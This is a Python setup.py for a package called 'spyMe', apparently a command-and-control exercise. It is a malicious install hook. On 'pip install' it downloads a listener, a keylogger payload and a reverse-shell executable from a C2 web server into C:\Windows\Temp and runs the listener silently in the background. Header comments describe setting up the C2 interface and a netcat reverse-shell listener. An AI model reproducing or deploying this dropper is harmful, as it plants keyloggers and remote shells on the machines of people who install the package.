from setuptools import setup
import sys, subprocess, requests, time


##### 1. run Rebex (SFTP) - *important to open it from C2 Folder!*
##### 2. run C2_Interface.py 
##### 3. open 127.0.0.1:5000 in Browser
##### 4. optional: spawn listener for revershell with "netcat -nlvp <PORT>" 
##### 5. run pip install phaseOne
 
def spyMe():
    # download listener & payload (=keylogger)
    r = requests.get(url="http://127.0.0.1:5000/listener_exe")
    open("C:\Windows\Temp\Alistener.exe", "wb").write(r.content)
    r = requests.get(url="http://127.0.0.1:5000/payload_exe")
    open("C:\Windows\Temp\Apayload.exe", "wb").write(r.content)
    r = requests.get(url="http://127.0.0.1:5000/Rshell_exe")
    open("C:\Windows\Temp\Rshell.exe", "wb").write(r.content)
    print("files downloaded")

    #execute listener as exe in background
    subprocess.Popen("C:\Windows\Temp\Alistener.exe", creationflags=8, close_fds=True)
    time.sleep(2)
    print("listening ...")
    return

#only execute with 'pip install' (once≠twice)
if sys.argv[1] == 'install':
    spyMe()

setup(
    name="spyMe",
    version="0.0.1",
    packages=[],
)
